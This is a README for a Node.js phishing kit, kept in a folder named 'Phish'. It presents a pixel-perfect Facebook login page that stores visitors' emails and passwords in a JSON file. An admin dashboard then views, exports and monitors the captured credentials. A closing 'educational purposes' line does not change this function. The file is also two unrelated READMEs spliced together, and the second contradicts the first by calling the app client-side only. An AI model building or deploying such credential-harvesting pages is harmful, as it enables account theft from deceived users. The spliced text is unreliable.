# Facebook Clone with Database Storage

A realistic Facebook login clone that captures and stores user credentials in a JSON database.

## 🚀 Quick Start

### Prerequisites
- Node.js (v14 or higher)
- npm (comes with Node.js)

### Installation & Setup

1. **Navigate to the project directory:**
   ```bash
   cd "d:\Documents\Phish\facebook-clone"
   ```

2. **Install dependencies:**
   ```bash
   npm install
   ```

3. **Start the server:**
   ```bash
   node server.js
   ```

4. **Access the application:**
   - Main Facebook Clone: `http://localhost:3000`
   - Admin Dashboard: `http://localhost:3000/admin`
   - Test Interface: `http://localhost:3000/database-test.html`

## 📋 Features

- ✅ **Realistic Facebook UI** - Pixel-perfect Facebook login interface
- ✅ **Credential Storage** - Automatically stores username/password in JSON database
- ✅ **Real-time Admin Dashboard** - View all captured credentials instantly
- ✅ **Login Validation** - Client-side form validation for realistic experience
- ✅ **Dashboard Simulation** - Shows fake Facebook dashboard after login
- ✅ **Export Functionality** - Download captured data as JSON
- ✅ **Auto-refresh** - Real-time monitoring of new login attempts

## 🔧 How It Works

1. **User visits the site** - Sees authentic Facebook login page
2. **User enters credentials** - Email and password with client-side validation
3. **Data is captured** - Credentials are sent to server and stored in `database.json`
4. **User sees dashboard** - Redirected to fake Facebook dashboard
5. **Admin monitors data** - View all captured credentials in admin panel

## 📊 Database Structure

The captured data is stored in `database.json` with the following format:

```json
[
  {
    "id": 1694123456789,
    "email": "user@example.com",
    "password": "their_password",
    "timestamp": "2025-09-14T15:30:45.123Z",
    "ip": "127.0.0.1",
    "userAgent": "Mozilla/5.0 Chrome/58.0.3029.110..."
  }
]
```

## 🌐 Available Endpoints

### Main Application
- `/` - Facebook login page
- `/admin` - Admin dashboard for viewing captured data
- `/database-test.html` - Testing interface

### API Endpoints
- `POST /api/login` - Submit login credentials
- `GET /api/credentials` - Retrieve all stored credentials
- `DELETE /api/credentials` - Clear all stored data
- `GET /api/status` - Check server status

## 🛡️ Admin Dashboard Features

Access the admin dashboard at `http://localhost:3000/admin` to:

- 📊 **View Statistics** - Total logins, unique emails, last login time
- 📋 **Browse Credentials** - See all captured usernames and passwords
- 📥 **Export Data** - Download credentials as JSON file
- 🗑️ **Clear Database** - Remove all stored data
- 🔄 **Auto-refresh** - Enable automatic data refresh every 10 seconds
- 📈 **Server Status** - Monitor server connectivity

## 🧪 Testing

### Manual Testing
1. Visit `http://localhost:3000`
2. Enter any valid email format and password (6+ characters)
3. Click "Log In"
4. Check admin dashboard to see captured data

### Quick Test Interface
Use `http://localhost:3000/database-test.html` for rapid testing:
- Pre-filled test credentials
- One-click testing
- Instant database viewing

## 📁 File Structure

```
facebook-clone/
├── server.js              # Main server file
├── package.json           # Dependencies
├── database.json          # Captured credentials storage
├── index.html             # Main Facebook login page
├── admin.html             # Admin dashboard
├── database-test.html     # Testing interface
├── css/
│   └── style.css          # Facebook-style CSS
└── js/
    └── script.js          # Client-side JavaScript
```

## ⚙️ Configuration

### Port Configuration
The server runs on port `3000` by default. To change:
1. Edit `server.js`
2. Change `const PORT = 3000;` to your desired port
3. Restart the server

### Database Location
Data is stored in `database.json` in the project root. This file is created automatically when the server starts.

## 🔒 Security Notes

This is a demonstration project for educational purposes. In production:
- Never store passwords in plain text
- Always use HTTPS
- Implement proper authentication and authorization
- Follow data protection regulations

## 🚨 Troubleshooting

### Server Won't Start
```bash
Error: listen EADDRINUSE: address already in use :::3000
```
**Solution:** Port 3000 is already in use. Either:
- Stop the existing process using the port
- Change the port in `server.js`

### Database Not Saving
- Check file permissions on the project directory
- Ensure `database.json` is writable
- Check server console for error messages

### Admin Dashboard Shows "Server Offline"
- Verify the server is running on port 3000
- Check browser console for network errors
- Try refreshing the page

## 🔧 Development

### Adding New Features
1. Modify `server.js` for backend changes
2. Update `js/script.js` for frontend functionality
3. Restart server to apply changes

### Customizing the UI
- Edit `css/style.css` for styling changes
- Modify `index.html` for layout changes
- Update `js/script.js` for behavior changes

## 📞 Support

If you encounter issues:
1. Check the troubleshooting section above
2. Verify all dependencies are installed correctly
3. Ensure Node.js version compatibility (v14+)

---

**Note:** This project is for educational and demonstration purposes only. Always follow ethical guidelines and applicable laws when using this software.
│   └── favicon.svg     # Facebook-style favicon
└── README.md           # This documentation
```

## 🧪 Testing

### Automated Testing
Open `test.html` for a testing interface with:
- **Test Panel**: Right-side panel with testing controls
- **Console Output**: Real-time test results and logs
- **Manual Tests**: Button-triggered validation tests

### Manual Testing Checklist
- [ ] Login with valid credentials
- [ ] Test form validation with invalid inputs
- [ ] Test responsive design (resize browser window)
- [ ] Test logout functionality
- [ ] Test keyboard navigation (Tab key)
- [ ] Test on mobile devices

### Test Commands
```bash
# Start local server (Python 3)
python -m http.server 8000

# Start local server (Node.js)
npx http-server

# Start local server (PHP)
php -S localhost:8000
```

## 💻 Technical Details

### Technologies Used
- **HTML5**: Semantic markup and accessibility features
- **CSS3**: Flexbox, Grid, animations, and media queries
- **JavaScript (ES6+)**: Classes, modules, and modern syntax
- **Local Storage**: Session persistence
- **HTTP Server**: For local development and testing

### Browser Compatibility
- ✅ Chrome 60+
- ✅ Firefox 55+
- ✅ Safari 12+
- ✅ Edge 79+
- ✅ Mobile browsers (iOS Safari, Chrome Mobile)

### Performance Features
- **Optimized CSS**: Efficient selectors and minimal reflows
- **Lazy Loading**: Animations trigger only when needed
- **Minimal JavaScript**: Lightweight, dependency-free code
- **Compressed Assets**: Optimized for fast loading

## 🎯 Demo Scenarios

### Scenario 1: Successful Login
1. Enter valid email: `demo@facebook.com`
2. Enter password: `demo123`
3. Click "Log In"
4. See welcome dashboard with personalized greeting

### Scenario 2: Form Validation
1. Enter invalid email: `not-an-email`
2. Enter short password: `123`
3. Observe real-time validation errors
4. Correct inputs to see validation success

### Scenario 3: Mobile Experience
1. Open on mobile device or resize browser
2. Notice responsive layout adaptation
3. Test touch interactions and mobile navigation

### Scenario 4: Session Persistence
1. Login successfully
2. Refresh the page
3. Notice you remain logged in
4. Logout and refresh to see login page

## 🔧 Customization

### Changing Colors
Edit `css/style.css` and modify these CSS variables:
```css
/* Facebook Blue */
--primary-color: #1877f2;
--primary-hover: #166fe5;
--primary-active: #1464cc;
```

### Adding Features
The codebase is modular and extensible:
- **Add new pages**: Create new HTML files
- **Extend functionality**: Add methods to the `FacebookClone` class
- **Custom validation**: Modify the validation functions
- **New animations**: Add CSS keyframes and transitions

### Security Notes
⚠️ **This is a demo application**:
- No real authentication
- No server-side validation
- No data encryption
- Not suitable for production use

## 🐛 Troubleshooting

### Common Issues

**Page doesn't load properly**
- Ensure you're using a local server (not file:// protocol)
- Check browser console for JavaScript errors
- Verify all files are in correct directories

**Styles not loading**
- Check that `css/style.css` exists
- Verify the CSS link in HTML
- Clear browser cache

**Login not working**
- Ensure JavaScript is enabled
- Check browser console for errors
- Verify email format is valid (contains @ and .)

**Mobile view issues**
- Check viewport meta tag is present
- Test with browser developer tools
- Verify CSS media queries are working

### Browser Console Commands
```javascript
// Check if app is loaded
window.facebookClone

// Manual login test
window.facebookClone.loginSuccess('test@example.com')

// Check current state
window.facebookClone.isLoggedIn

// Clear saved data
localStorage.clear()
```

## 📱 Mobile Features

### Touch Support
- **Swipe gestures**: Pull-to-refresh simulation
- **Touch-friendly buttons**: Proper sizing for mobile
- **Responsive text**: Scales appropriately for different screens
- **Mobile navigation**: Optimized header layout

### Progressive Web App Features
- **Responsive design**: Works across all device sizes
- **Fast loading**: Optimized for mobile networks
- **Offline-ready**: Basic functionality without network
- **App-like experience**: Full-screen mobile interface

## 🌟 Future Enhancements

### Potential Additions
- [ ] **User Profiles**: Avatar upload and profile editing
- [ ] **News Feed**: Scrollable post interface
- [ ] **Friends System**: Friend requests and lists
- [ ] **Messaging**: Basic chat functionality
- [ ] **Posts**: Create and share content
- [ ] **Notifications**: Real-time updates
- [ ] **Dark Mode**: Theme switching
- [ ] **Internationalization**: Multiple language support

### Advanced Features
- [ ] **Backend Integration**: Real authentication
- [ ] **Database**: User data persistence
- [ ] **API Integration**: Social media features
- [ ] **Push Notifications**: Browser notifications
- [ ] **Progressive Web App**: Installable app experience

## 📄 License

This project is created for educational and demonstration purposes only. Facebook and its design elements are trademarks of Meta Platforms, Inc.

## 👨‍💻 Development

Created as a demonstration of modern web development practices including:
- Responsive design principles
- JavaScript ES6+ features
- CSS3 animations and transitions
- Accessibility best practices
- Mobile-first development
- Performance optimization

---

## 🎉 Thank You Message

**Congratulations!** You've successfully explored our Facebook clone demo. This project demonstrates:

✅ **Professional UI/UX Design**  
✅ **Responsive Web Development**  
✅ **Form Validation & User Experience**  
✅ **Modern JavaScript Practices**  
✅ **Accessibility & Performance**  

Thank you for testing our Facebook clone. We hope this demonstrates the quality and attention to detail in our web development work!